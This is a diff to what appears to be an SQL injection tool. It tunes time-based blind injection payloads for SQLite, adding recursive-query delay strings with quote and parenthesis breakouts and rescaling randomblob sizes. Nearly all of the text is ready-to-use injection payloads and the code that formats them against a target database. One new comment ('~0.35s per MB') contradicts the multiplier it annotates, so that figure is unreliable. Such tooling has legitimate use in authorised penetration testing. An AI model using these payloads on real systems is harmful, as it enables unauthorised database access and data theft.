@@ -502,7 +502,10 @@ TIME_PAYLOADS: dict[str, List[str]] = {
         "')) AND pg_sleep({delay})-- -",
     ],
     "sqlite": [
-        "' AND randomblob({blob_size})-- -",   # {blob_size} = delay * 10_000_000
+        # WITH RECURSIVE is reliable in containerised SQLite where randomblob is too fast
+        "' AND (WITH RECURSIVE cnt(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM cnt WHERE x<{bench}) SELECT COUNT(*) FROM cnt)>0-- -",
+        "') AND (WITH RECURSIVE cnt(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM cnt WHERE x<{bench}) SELECT COUNT(*) FROM cnt)>0-- -",
+        "' AND randomblob({blob_size})-- -",   # fallback: large randomblob
         "') AND randomblob({blob_size})-- -",
         "')) AND randomblob({blob_size})-- -",
         "')) AND randomblob({blob_size}) --",
@@ -756,7 +759,7 @@ def get_time_payloads(dbms: str, delay: int) -> List[str]:
     """Return time-based payloads with {delay} and {bench}/{blob_size} substituted."""
     raw = TIME_PAYLOADS.get(dbms, TIME_PAYLOADS["auto"])
     bench = delay * 5_000_000        # MySQL BENCHMARK iterations
-    blob_size = delay * 10_000_000   # SQLite randomblob bytes
+    blob_size = delay * 350_000_000  # SQLite randomblob bytes (~0.35s per MB in Docker)
     return [
         p.format(delay=delay, bench=bench, blob_size=blob_size)
         for p in raw
